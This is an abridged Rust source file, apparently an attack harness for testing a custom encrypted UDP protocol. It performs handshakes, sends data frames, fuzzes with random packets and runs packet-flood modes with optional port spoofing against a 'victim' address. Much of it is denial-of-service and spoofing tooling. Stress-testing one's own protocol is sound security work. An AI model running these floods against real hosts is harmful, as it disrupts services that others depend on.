...
use vantablack::ghost::layers::l0_identity::{verify_peer_signature, GhostIdentity};
use vantablack::ghost::layers::l1_kem::{
    build_handshake_pdu, derive_hybrid_master_key, generate_kyber_keypair, kyber_encapsulate,
    parse_handshake_pdu, parse_response_pdu, HANDSHAKE_BLOB_LEN,
};
...
use vantablack::ghost::net::{
    build_gtf_frame, frame_shard, parse_packet_counter, parse_session_hash, unframe, GTF_BULK_SIZE,
    MAX_PAYLOAD_LEN, MIN_FRAME_SIZE, OFFSET_AUTH_TAG_START, OFFSET_PAYLOAD_START,
};
use vantablack::ghost::session::{Session, SessionRole};
use x25519_dalek::{EphemeralSecret, PublicKey as XPublicKey};

fn verbose() -> bool {
    std::env::var("ATTACKER_VERBOSE").is_ok()
}
...
fn send3(
    ...
    for i in 0..3 {
        let frame = build_gtf_frame(sh, ctr, i as u8, &f[i], &[0u8; 16], false);
        send_pkt(sock, dst, &frame);
        out.push(frame);
    }
}
...
fn handshake(peer: SocketAddr, spoof_port: Option<u16>) -> Option<PqSession> {
    ...
    let resp = [
        w[0].as_ref().unwrap().as_slice(),
        w[1].as_ref().unwrap().as_slice(),
    ]
    .concat();
    ...
    println!(
        "[*] session established  peer={fp}  sh={}  key8={}",
        hex::encode(session.session_hash),
        hex::encode(&master[..8])
    );
    Some(PqSession {
...
fn cmd_data(s: &mut PqSession, ctr: u32, payload: &[u8]) {
    ...
    println!(
        "[*] sent encrypted data frame ctr={ctr} payload={} bytes",
        payload.len()
    );
}
...
fn cmd_fuzz(peer: SocketAddr, n: usize) {
    ...
    for i in 0..n {
        ...
        let mut pkt = match kind {
            0 => {
                let l = (rand() % 1400) as usize;
                (0..l).map(|_| (rand() % 256) as u8).collect()
            }
            1 => {
                let l = 8 + (rand() % 40) as usize;
                (0..l).map(|_| (rand() % 256) as u8).collect()
            }
            2 => {
                // GTF-like header with random payload
...
fn cmd_spoolflood(peer: SocketAddr, n: usize) {
    ...
    for i in 0..n {
        ...
        let len = 4u16;
        buf[OFFSET_PAYLOAD_START..OFFSET_PAYLOAD_START + 2].copy_from_slice(&len.to_be_bytes());
        send_pkt(&sock, &peer, &buf);
        if i % 5000 == 0 {
            println!("[spoolflood] {i}/{n}");
        }
    }
...
fn cmd_handflood(peer: SocketAddr, n: usize, spoof_port: Option<u16>) {
    for i in 0..n {
        ...
        for j in 0..3 {
            let frame =
                build_gtf_frame([0; 4], 0, j as u8, &frame_shard(&raw[j]), &[0u8; 16], false);
            send_pkt(&sock, &peer, &frame);
        }
        if i % 100 == 0 {
            println!("[handflood] {i}/{n}");
        }
    }
...
fn main() {
    ...
    if args.len() < 2 {
        println!("usage: attack_harness <cmd> ...");
        return;
    }
    let spoof_port = std::env::var("ATTACKER_SPOOF")
        .ok()
        .and_then(|v| v.parse().ok());
    let peer: SocketAddr = match args.get(2).map(|s| s.parse()) {
        Some(Ok(a)) => a,
        _ => {
            println!("need victim ip:port");
            return;
        }
    };
    match args[1].as_str() {
        "handshake" => {
            let _ = handshake(peer, spoof_port);
        }
        "fuzz" => {
        ...
        "beacon" => {
            let fp = args
                .get(3)
                .cloned()
                .unwrap_or_else(|| "0011223344556677".into());
            cmd_beacon(&fp);
        }
